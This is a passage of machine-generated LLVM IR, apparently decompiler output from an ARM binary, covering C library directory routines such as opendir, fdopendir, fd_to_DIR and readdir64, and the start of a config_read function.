  store i32 %v1_e810, i32* %r3.global-to-local, align 4
  %v3_e814 = add i32 %v4_e808, %v0_e804
  %v4_e814 = inttoptr i32 %v3_e814 to i32*
  store i32 %v1_e810, i32* %v4_e814, align 4
  %v0_e8c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e8c4

dec_label_pc_e81c:                                ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v1_e820 = add i32 %tmp, 24
  store i32 %v1_e820, i32* %r2.global-to-local, align 4
  %v4_e828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 72) to i32*), align 4
  store i32 %v4_e828, i32* %r1.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_e834 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_e834)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_e84c = load i32, i32* @r6, align 4
  %v2_e84c = add i32 %v0_e84c, 16
  %v3_e84c = inttoptr i32 %v2_e84c to i32*
  %v4_e84c = load i32, i32* %v3_e84c, align 4
  call void @__pseudo_branch(i32 %v4_e84c)
  %v0_e858 = load i32, i32* @r7, align 4
  %v1_e858 = inttoptr i32 %v0_e858 to i32*
  %v2_e858 = load i32, i32* %v1_e858, align 4
  store i32 %v2_e858, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_e868 = load i32, i32* @r8, align 4
  store i32 %v0_e868, i32* %v1_e858, align 4
  %v0_e86c = load i32, i32* @r6, align 4
  %v1_e86c = load i32, i32* %r3.global-to-local, align 4
  %v2_e86c = add i32 %v1_e86c, %v0_e86c
  %v3_e86c = inttoptr i32 %v2_e86c to i32*
  %v4_e86c = load i32, i32* %v3_e86c, align 4
  store i32 ptrtoint (i32* @global_var_e878.317 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e86c)
  %v0_e878 = load i32, i32* @r7, align 4
  %v1_e878 = add i32 %v0_e878, 12
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  %v3_e878 = load i32, i32* %v2_e878, align 4
  store i32 %v3_e878, i32* @r0, align 4
  %v0_e87c = call i32 @free()
  %v0_e880 = load i32, i32* @r7, align 4
  store i32 %v0_e880, i32* @r0, align 4
  %v0_e884 = call i32 @free()
  %v0_e88c = load i32, i32* @r4, align 4
  store i32 %v0_e88c, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_e88c, -4095
  br i1 %tmp11, label %dec_label_pc_e8c0, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e81c
  store i32 ptrtoint (i32* @global_var_13a38.319 to i32), i32* %r3.global-to-local, align 4
  %v0_e8ac = call i32 @__aeabi_read_tp()
  %v3_e8b0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e8b0 = sext i16 %v3_e8b0 to i32
  store i32 %v4_e8b0, i32* %r3.global-to-local, align 4
  %v0_e8b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e8b4 = sub i32 0, %v0_e8b4
  store i32 %v1_e8b4, i32* %r2.global-to-local, align 4
  %v3_e8b8 = add i32 %v4_e8b0, %v0_e8ac
  %v4_e8b8 = inttoptr i32 %v3_e8b8 to i32*
  store i32 %v1_e8b4, i32* %v4_e8b8, align 4
  %v0_e8bc = load i32, i32* @r8, align 4
  br label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e81c, %dec_label_pc_e8a8
  %v0_e8c0 = phi i32 [ %v0_e88c, %dec_label_pc_e81c ], [ %v0_e8bc, %dec_label_pc_e8a8 ]
  store i32 %v0_e8c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e8c4

dec_label_pc_e8c4:                                ; preds = %dec_label_pc_e800, %dec_label_pc_e8c0
  %v0_e8c4 = phi i32 [ %v0_e8c4.pre, %dec_label_pc_e800 ], [ %v0_e8c0, %dec_label_pc_e8c0 ]
  ret i32 %v0_e8c4

; uselistorder directives
  uselistorder i32 %v0_e88c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e8c4, { 1, 0 }
  uselistorder label %dec_label_pc_e8c0, { 1, 0 }
}

define i32 @function_e8dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e8dc:
  %v0_e8dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e8dc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_e8dc
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_e8dc, %bb
  %v10_e8ec = phi i32 [ %arg1, %dec_label_pc_e8dc ], [ 0, %bb ]
  ret i32 %v10_e8ec

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_e8f0 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_e904 = call i32 @malloc(i32 48)
  %v2_e90c = icmp eq i32 %v1_e904, 0
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  br i1 %v2_e90c, label %bb, label %dec_label_pc_e91c

bb:                                               ; preds = %entry
  br label %dec_label_pc_e9a8

dec_label_pc_e91c:                                ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e920 = load i32, i32* @r4, align 4
  %v2_e920 = icmp ugt i32 %v0_e920, 511
  %v2_e924 = add i32 %v1_e904, 4
  %v3_e924 = inttoptr i32 %v2_e924 to i32*
  store i32 0, i32* %v3_e924, align 4
  %v0_e928 = load i32, i32* %r3.global-to-local, align 4
  %v2_e928 = add i32 %v1_e904, 16
  %v3_e928 = inttoptr i32 %v2_e928 to i32*
  store i32 %v0_e928, i32* %v3_e928, align 4
  %v0_e92c = load i32, i32* %r3.global-to-local, align 4
  %v2_e92c = add i32 %v1_e904, 8
  %v3_e92c = inttoptr i32 %v2_e92c to i32*
  store i32 %v0_e92c, i32* %v3_e92c, align 4
  br i1 %v2_e920, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_e91c
  %v0_e9342 = load i32, i32* @r4, align 4
  %v2_e9343 = add i32 %v1_e904, 20
  %v3_e9344 = inttoptr i32 %v2_e9343 to i32*
  store i32 %v0_e9342, i32* %v3_e9344, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_e91c
  %v1_e930 = load i32, i32* %r3.global-to-local, align 4
  %v2_e930 = add i32 %v1_e930, 512
  store i32 %v2_e930, i32* %r3.global-to-local, align 4
  %v0_e934 = load i32, i32* @r4, align 4
  %v2_e934 = add i32 %v1_e904, 20
  %v3_e934 = inttoptr i32 %v2_e934 to i32*
  store i32 %v0_e934, i32* %v3_e934, align 4
  %v1_e938 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_e938, i32* %v3_e934, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_e904, i32* @r5, align 4
  %v0_e940 = load i32, i32* @r7, align 4
  %v2_e940 = inttoptr i32 %v1_e904 to i32*
  store i32 %v0_e940, i32* %v2_e940, align 4
  %v0_e944 = load i32, i32* @r5, align 4
  %v1_e944 = add i32 %v0_e944, 20
  %v2_e944 = inttoptr i32 %v1_e944 to i32*
  %v3_e944 = load i32, i32* %v2_e944, align 4
  store i32 %v3_e944, i32* %r1.global-to-local, align 4
  %v2_e94c = call i32 @calloc(i32 1, i32 %v3_e944)
  %v2_e950 = icmp eq i32 %v2_e94c, 0
  store i32 %v2_e94c, i32* @r4, align 4
  %v1_e958 = load i32, i32* @r5, align 4
  %v2_e958 = add i32 %v1_e958, 12
  %v3_e958 = inttoptr i32 %v2_e958 to i32*
  store i32 %v2_e94c, i32* %v3_e958, align 4
  br i1 %v2_e950, label %dec_label_pc_e960, label %dec_label_pc_e970

dec_label_pc_e960:                                ; preds = %bb17
  %v0_e960 = load i32, i32* @r5, align 4
  store i32 %v0_e960, i32* @r0, align 4
  %v0_e964 = call i32 @free()
  %v0_e968 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9a8

dec_label_pc_e970:                                ; preds = %bb17
  %v0_e974 = load i32, i32* @r6, align 4
  %v2_e974 = add i32 %v0_e974, -37288
  store i32 %v2_e974, i32* %r3.global-to-local, align 4
  %v1_e97c = inttoptr i32 %v2_e974 to i32*
  %v2_e97c = load i32, i32* %v1_e97c, align 4
  %v3_e97c = add i32 %v0_e974, -37284
  %v4_e97c = inttoptr i32 %v3_e97c to i32*
  %v5_e97c = load i32, i32* %v4_e97c, align 4
  store i32 %v5_e97c, i32* %r1.global-to-local, align 4
  %v6_e97c = add i32 %v0_e974, -37280
  %v7_e97c = inttoptr i32 %v6_e97c to i32*
  %v8_e97c = load i32, i32* %v7_e97c, align 4
  store i32 %v8_e97c, i32* %r2.global-to-local, align 4
  %v9_e97c = add i32 %v0_e974, -37276
  %v10_e97c = inttoptr i32 %v9_e97c to i32*
  %v11_e97c = load i32, i32* %v10_e97c, align 4
  store i32 %v11_e97c, i32* %r3.global-to-local, align 4
  %v12_e97c = add i32 %v0_e974, -37272
  %v1_e988 = inttoptr i32 %v12_e97c to i32*
  %v2_e988 = load i32, i32* %v1_e988, align 4
  %v3_e988 = add i32 %v0_e974, -37268
  %v4_e988 = inttoptr i32 %v3_e988 to i32*
  %v5_e988 = load i32, i32* %v4_e988, align 4
  store i32 %v2_e988, i32* %stack_var_-32, align 4
  store i32 %v5_e97c, i32* %r1.global-to-local, align 4
  store i32 %v8_e97c, i32* %r2.global-to-local, align 4
  store i32 %v11_e97c, i32* %r3.global-to-local, align 4
  %v0_e998 = load i32, i32* @r5, align 4
  %v1_e998 = add i32 %v0_e998, 24
  %v1_e99c = inttoptr i32 %v1_e998 to i32*
  store i32 %v2_e97c, i32* %v1_e99c, align 4
  %v3_e99c = add i32 %v0_e998, 28
  %v4_e99c = inttoptr i32 %v3_e99c to i32*
  %v5_e99c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_e99c, i32* %v4_e99c, align 4
  %v6_e99c = add i32 %v0_e998, 32
  %v7_e99c = inttoptr i32 %v6_e99c to i32*
  %v8_e99c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_e99c, i32* %v7_e99c, align 4
  %v9_e99c = add i32 %v0_e998, 36
  %v10_e99c = inttoptr i32 %v9_e99c to i32*
  %v11_e99c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_e99c, i32* %v10_e99c, align 4
  %v12_e99c = add i32 %v0_e998, 40
  %v2_e9a0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_e988, i32* %r1.global-to-local, align 4
  %v1_e9a4 = inttoptr i32 %v12_e99c to i32*
  store i32 %v2_e9a0, i32* %v1_e9a4, align 4
  %v3_e9a4 = add i32 %v0_e998, 44
  %v4_e9a4 = inttoptr i32 %v3_e9a4 to i32*
  %v5_e9a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_e9a4, i32* %v4_e9a4, align 4
  %v0_e9a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %bb, %dec_label_pc_e960, %dec_label_pc_e970
  %v0_e9a8 = phi i32 [ 0, %bb ], [ %v0_e968, %dec_label_pc_e960 ], [ %v0_e9a8.pre, %dec_label_pc_e970 ]
  store i32 %v12_e8f0, i32* @r7, align 4
  ret i32 %v0_e9a8

; uselistorder directives
  uselistorder i32 %v2_e94c, { 1, 0, 2 }
  uselistorder i32 %v1_e904, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_e9a8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_e9c8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_e9f8, label %dec_label_pc_e9e0

dec_label_pc_e9e0:                                ; preds = %entry
  %v0_e9e4 = call i32 @__aeabi_read_tp()
  %v3_e9e8 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e9e8 = sext i16 %v3_e9e8 to i32
  %v0_e9ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e9ec = sub i32 0, %v0_e9ec
  store i32 %v1_e9ec, i32* %r2.global-to-local, align 4
  %v3_e9f0 = add i32 %v4_e9e8, %v0_e9e4
  %v4_e9f0 = inttoptr i32 %v3_e9f0 to i32*
  store i32 %v1_e9ec, i32* %v4_e9f0, align 4
  br label %dec_label_pc_ea1c

dec_label_pc_e9f8:                                ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_e9f8 = icmp slt i32 %arg1, 0
  br i1 %v1_e9f8, label %dec_label_pc_ea1c, label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f8
  store i32 %v2_e9c8, i32* @r1, align 4
  %v0_ea04 = call i32 @fstat()
  %v1_ea08 = icmp slt i32 %v0_ea04, 0
  br i1 %v1_ea08, label %dec_label_pc_ea10, label %dec_label_pc_ea24

dec_label_pc_ea10:                                ; preds = %dec_label_pc_ea00
  br label %dec_label_pc_ea1c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_ea10, %dec_label_pc_e9f8, %dec_label_pc_e9e0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea24:                                ; preds = %dec_label_pc_ea00
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_ea2c = load i32, i32* @r7, align 4
  %v3_ea30 = call i32 @__GI___fcntl_nocancel(i32 %v0_ea2c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_ea38 = load i32, i32* @r7, align 4
  %v2_ea3c = call i32 @fd_to_DIR(i32 %v0_ea38, i32 %tmp)
  store i32 %v2_ea3c, i32* %r1.global-to-local, align 4
  %v2_ea40 = icmp eq i32 %v2_ea3c, 0
  br i1 %v2_ea40, label %dec_label_pc_ea48, label %dec_label_pc_ea68

dec_label_pc_ea48:                                ; preds = %dec_label_pc_ea24
  %v0_ea58 = call i32 @__aeabi_read_tp()
  %v3_ea5c = load i16, i16* @global_var_222f0.75, align 2
  %v4_ea5c = sext i16 %v3_ea5c to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_ea64 = add i32 %v4_ea5c, %v0_ea58
  %v4_ea64 = inttoptr i32 %v3_ea64 to i32*
  store i32 12, i32* %v4_ea64, align 4
  %v0_ea68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea24, %dec_label_pc_ea1c, %dec_label_pc_ea48
  %v0_ea68 = phi i32 [ %v2_ea3c, %dec_label_pc_ea24 ], [ 0, %dec_label_pc_ea1c ], [ %v0_ea68.pre, %dec_label_pc_ea48 ]
  ret i32 %v0_ea68

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ea68, { 2, 0, 1 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ea78:
  %v0_ea78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ea78, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_ea78
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_ea78, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_ea88 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_ea88, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ea94 = call i32 @fstat()
  store i32 %v0_ea94, i32* @r5, align 4
  %v2_ea98 = icmp eq i32 %v0_ea94, 0
  br i1 %v2_ea98, label %dec_label_pc_eaa0, label %dec_label_pc_eb18

dec_label_pc_eaa0:                                ; preds = %entry
  %v1_eaa4 = and i32 %tmp4, 61440
  store i32 %v1_eaa4, i32* @r3, align 4
  %v7_eaa8 = icmp eq i32 %v1_eaa4, 16384
  br i1 %v7_eaa8, label %dec_label_pc_eac8, label %dec_label_pc_eab0

dec_label_pc_eab0:                                ; preds = %dec_label_pc_eaa0
  %v0_eab4 = call i32 @__aeabi_read_tp()
  %v3_eab8 = load i16, i16* @global_var_222f0.75, align 2
  %v0_eabc = load i32, i32* @r5, align 4
  store i32 %v0_eabc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eafc

dec_label_pc_eac8:                                ; preds = %dec_label_pc_eaa0
  %v0_eac8 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_ead0 = call i32 @__libc_fcntl(i32 %v0_eac8, i32 3)
  %v7_ead4 = icmp eq i32 %v2_ead0, -1
  br i1 %v7_ead4, label %dec_label_pc_eb18, label %dec_label_pc_eadc

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eac8
  %v1_eadc = urem i32 %v2_ead0, 4
  store i32 %v1_eadc, i32* %r3.global-to-local, align 4
  %v7_eae0 = icmp eq i32 %v1_eadc, 1
  br i1 %v7_eae0, label %dec_label_pc_eae8, label %dec_label_pc_eb04

dec_label_pc_eae8:                                ; preds = %dec_label_pc_eadc
  %v0_eaec = call i32 @__aeabi_read_tp()
  %v3_eaf0 = load i16, i16* @global_var_222f0.75, align 2
  %v0_eaf4 = load i32, i32* @r5, align 4
  store i32 %v0_eaf4, i32* %r1.global-to-local, align 4
  %v0_eaf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_eaf8 = add i32 %v0_eaf8, 21
  br label %dec_label_pc_eafc

dec_label_pc_eafc:                                ; preds = %dec_label_pc_eab0, %dec_label_pc_eae8
  %v2_eafc.in = phi i16 [ %v3_eab8, %dec_label_pc_eab0 ], [ %v3_eaf0, %dec_label_pc_eae8 ]
  %v1_eafc = phi i32 [ %v0_eab4, %dec_label_pc_eab0 ], [ %v0_eaec, %dec_label_pc_eae8 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_eab0 ], [ %v1_eaf8, %dec_label_pc_eae8 ]
  %v2_eafc = sext i16 %v2_eafc.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_eafc = add i32 %v1_eafc, %v2_eafc
  %v4_eafc = inttoptr i32 %v3_eafc to i32*
  store i32 %storemerge, i32* %v4_eafc, align 4
  %v0_eb1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eb1c

dec_label_pc_eb04:                                ; preds = %dec_label_pc_eadc
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_eb08 = load i32, i32* @r4, align 4
  %v2_eb0c = call i32 @fd_to_DIR(i32 %v0_eb08, i32 %tmp)
  store i32 %v2_eb0c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eb1c

dec_label_pc_eb18:                                ; preds = %entry, %dec_label_pc_eac8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eb1c

dec_label_pc_eb1c:                                ; preds = %dec_label_pc_eb04, %dec_label_pc_eafc, %dec_label_pc_eb18
  %v0_eb1c = phi i32 [ %v2_eb0c, %dec_label_pc_eb04 ], [ %v0_eb1c.pre, %dec_label_pc_eafc ], [ 0, %dec_label_pc_eb18 ]
  ret i32 %v0_eb1c

; uselistorder directives
  uselistorder i32 %v1_eadc, { 1, 0 }
  uselistorder i32 %v2_ead0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_eb1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb18, { 1, 0 }
  uselistorder label %dec_label_pc_eafc, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  %v1_eb48 = add i32 %tmp, 24
  store i32 %v1_eb48, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_eb60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  store i32 %v4_eb60, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_eb60)
  %v0_eb74 = load i32, i32* @r6, align 4
  %v2_eb74 = add i32 %v0_eb74, 16
  %v3_eb74 = inttoptr i32 %v2_eb74 to i32*
  %v4_eb74 = load i32, i32* %v3_eb74, align 4
  store i32 %v4_eb74, i32* %ip.global-to-local, align 4
  store i32 60288, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_eb74)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_ebb4, %entry
  %v0_eb84 = load i32, i32* @r5, align 4
  %v1_eb84 = add i32 %v0_eb84, 4
  %v2_eb84 = inttoptr i32 %v1_eb84 to i32*
  %v3_eb84 = load i32, i32* %v2_eb84, align 4
  %v4_eb84 = add i32 %v0_eb84, 8
  %v5_eb84 = inttoptr i32 %v4_eb84 to i32*
  %v6_eb84 = load i32, i32* %v5_eb84, align 4
  %tmp10 = icmp ugt i32 %v6_eb84, %v3_eb84
  br i1 %tmp10, label %dec_label_pc_ebb4, label %dec_label_pc_eb90

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb84
  %v1_eb90 = inttoptr i32 %v0_eb84 to i32*
  %v2_eb90 = load i32, i32* %v1_eb90, align 4
  %v1_eb94 = add i32 %v0_eb84, 12
  %v2_eb94 = inttoptr i32 %v1_eb94 to i32*
  %v3_eb94 = load i32, i32* %v2_eb94, align 4
  %v1_eb98 = add i32 %v0_eb84, 20
  %v2_eb98 = inttoptr i32 %v1_eb98 to i32*
  %v3_eb98 = load i32, i32* %v2_eb98, align 4
  %v4_eb9c = inttoptr i32 %v3_eb94 to i32*
  %v5_eb9c = call i32 @__getdents64(i32 %v2_eb90, i32* %v4_eb9c, i32 %v3_eb98, i32 %v6_eb84)
  %tmp9 = icmp slt i32 %v5_eb9c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_ebac

.thread:                                          ; preds = %dec_label_pc_eb90
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_ebe4

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eb90
  %v1_ebac = load i32, i32* @r5, align 4
  %v2_ebac = add i32 %v1_ebac, 8
  %v3_ebac = inttoptr i32 %v2_ebac to i32*
  store i32 %v5_eb9c, i32* %v3_ebac, align 4
  %v0_ebb0 = load i32, i32* @r7, align 4
  %v1_ebb0 = load i32, i32* @r5, align 4
  %v2_ebb0 = add i32 %v1_ebb0, 4
  %v3_ebb0 = inttoptr i32 %v2_ebb0 to i32*
  store i32 %v0_ebb0, i32* %v3_ebb0, align 4
  %v0_ebb4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eb84, %dec_label_pc_ebac
  %v1_ebd8 = phi i32 [ %v0_eb84, %dec_label_pc_eb84 ], [ %v0_ebb4.pre, %dec_label_pc_ebac ]
  %v1_ebb4 = add i32 %v1_ebd8, 4
  %v2_ebb4 = inttoptr i32 %v1_ebb4 to i32*
  %v3_ebb4 = load i32, i32* %v2_ebb4, align 4
  %v1_ebb8 = add i32 %v1_ebd8, 12
  %v2_ebb8 = inttoptr i32 %v1_ebb8 to i32*
  %v3_ebb8 = load i32, i32* %v2_ebb8, align 4
  %v2_ebbc = add i32 %v3_ebb8, %v3_ebb4
  store i32 %v2_ebbc, i32* @r4, align 4
  %v3_ebc0 = inttoptr i32 %v2_ebbc to i32*
  %v4_ebc0 = load i32, i32* %v3_ebc0, align 4
  %v1_ebc4 = add i32 %v2_ebbc, 4
  %v2_ebc4 = inttoptr i32 %v1_ebc4 to i32*
  %v3_ebc4 = load i32, i32* %v2_ebc4, align 4
  %v1_ebc8 = add i32 %v2_ebbc, 16
  %v2_ebc8 = inttoptr i32 %v1_ebc8 to i16*
  %v3_ebc8 = load i16, i16* %v2_ebc8, align 2
  %v4_ebc8 = zext i16 %v3_ebc8 to i32
  %v1_ebcc = add i32 %v2_ebbc, 8
  %v2_ebcc = inttoptr i32 %v1_ebcc to i32*
  %v3_ebcc = load i32, i32* %v2_ebcc, align 4
  store i32 %v3_ebcc, i32* %ip.global-to-local, align 4
  %v2_ebd0 = add i32 %v4_ebc8, %v3_ebb4
  %v2_ebd4 = or i32 %v3_ebc4, %v4_ebc0
  %v4_ebd4 = icmp eq i32 %v2_ebd4, 0
  store i32 %v2_ebd0, i32* %v2_ebb4, align 4
  %v0_ebdc = load i32, i32* %ip.global-to-local, align 4
  %v1_ebdc = load i32, i32* @r5, align 4
  %v2_ebdc = add i32 %v1_ebdc, 16
  %v3_ebdc = inttoptr i32 %v2_ebdc to i32*
  store i32 %v0_ebdc, i32* %v3_ebdc, align 4
  br i1 %v4_ebd4, label %dec_label_pc_eb84, label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebb4, %.thread
  %v0_ebf0 = load i32, i32* @r6, align 4
  %v2_ebf0 = add i32 %v0_ebf0, 48
  %v3_ebf0 = inttoptr i32 %v2_ebf0 to i32*
  %v4_ebf0 = load i32, i32* %v3_ebf0, align 4
  store i32 %v4_ebf0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ebf0)
  %v0_ebfc = load i32, i32* @r4, align 4
  ret i32 %v0_ebfc

; uselistorder directives
  uselistorder i32 %v2_ebbc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_ebd8, { 1, 0 }
  uselistorder i32 %v6_eb84, { 1, 0 }
  uselistorder i32 %v0_eb84, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_ebb4, { 1, 0 }
}

define i32 @function_ec10(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec10:
  %v0_ec10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ec10, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_ec10
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ec10, %bb
  %v10_ec1c = phi i32 [ %arg1, %dec_label_pc_ec10 ], [ 0, %bb ]
  ret i32 %v10_ec1c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_ec20 = load i32, i32* @r4, align 4
  %v6_ec20 = load i32, i32* @r5, align 4
  %v9_ec20 = load i32, i32* @r6, align 4
  %v12_ec20 = load i32, i32* @r7, align 4
  %v15_ec20 = load i32, i32* @r8, align 4
  %v18_ec20 = load i32, i32* @sb, align 4
  %v21_ec20 = load i32, i32* @sl, align 4
  %v24_ec20 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_ec24 = icmp eq i32* %arg1, null
  store i1 %v2_ec24, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_ec24, label %dec_label_pc_ef34, label %dec_label_pc_ec3c

dec_label_pc_ec3c:                                ; preds = %entry
  %v1_ec3c = urem i32 %arg3, 256
  store i32 %v1_ec3c, i32* @sb, align 4
  %v1_ec40 = udiv i32 %arg3, 256
  %v3_ec44 = urem i32 %v1_ec40, 256
